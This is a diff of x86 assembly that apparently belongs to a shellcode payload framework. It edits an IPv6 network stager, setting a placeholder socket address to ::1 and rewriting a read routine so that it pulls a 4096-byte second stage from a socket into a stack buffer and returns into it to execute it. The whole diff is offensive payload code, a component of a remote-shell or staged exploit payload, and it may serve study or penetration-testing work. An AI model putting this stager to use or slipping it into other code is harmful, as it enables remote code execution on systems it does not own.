@@ -76,10 +76,10 @@ ipv6_address:
 	db 28          ; sa_family_t     sin6_family;    /* AF_INET6 */
 	dw 0xbfbf      ; in_port_t       sin6_port;      /* Transport layer port # */
 	dd 0           ; uint32_t        sin6_flowinfo;  /* IP6 flow information */
-	dd 0x43424140  ; struct in6_addr sin6_addr;      /* IP6 address */
-	dd 0x48474645
-	dd 0x4d4b4a49
-	dd 0x51504f4e
+	dd 0           ; struct in6_addr sin6_addr;      /* IP6 address */
+	dd 0
+	dd 0
+	dd 0x01000000  ; default to ::1
 	dd 0           ; uint32_t        sin6_scope_id;  /* scope zone index */
 
 skip_bounce:
@@ -87,9 +87,26 @@ skip_bounce:
 %ifndef USE_SINGLE_STAGE
 
 read:
-	mov  al, 0x3
-	mov  byte [ecx - 0x3], 0x10
-	int  0x80
-	ret
+	push byte 0x10
+	pop edx
+	shl edx, 8
+	sub esp, edx
+	mov ecx, esp ; Points to 4096 stack buffer
+	
+	push edx     ; Length
+	push ecx     ; Buffer
+	
+%ifdef FD_REG_EBX
+	push ebx     ; Socket
+%else
+	push edi     ; Socket
+%endif	
+
+	push ecx     ; Buffer to Return
+	
+	mov al, 0x3	
+	int 0x80     ; read(socket, &buff, 4096)
+	
+	ret          ; Return
 
 %endif
